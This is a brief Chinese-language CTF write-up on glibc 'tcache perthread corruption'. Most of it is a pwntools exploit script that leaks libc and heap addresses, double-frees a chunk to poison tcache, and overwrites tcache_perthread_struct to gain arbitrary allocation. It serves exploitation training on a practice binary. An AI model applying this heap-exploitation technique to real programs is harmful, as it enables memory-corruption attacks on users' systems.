# tcache perthread corruption

通过tcache中的perthread corruption主要是记录了tcache特征的一个文件并且他也有一个关键的结构体可以用来控制tcache也就是tcache-perthread-struct同时也可以明白如果我们控制了这个结构体上的数据就是控制了整个tcache就可以得到一个任意地址写

```python
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))

add_chunk(0,0x410)
add_chunk(1,0x10)

delete_chunk(0)
show_chunk(0)

p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8,b'\x00'))-0x3afca0
info('libc.address:'+hex(libc.address))

add_chunk(0,0x100)
delete_chunk(0)
delete_chunk(0)
add_chunk(0,0x100)
show_chunk(0)
p.recv()
heap_addr = u64(p.recv(6)[-6:].ljust(8,b'\x00'))&~0xfff
info('heap_addr: '+hex(heap_addr))
edit_chunk(0,p64(heap_addr+0x10))
add_chunk(0,0x100)
add_chunk(0,0x100) #
edit_chunk(0,p8(7)*64+p64(0xdeedbeef)*0x64)
gdb.attach(p)

p.interactive()

```

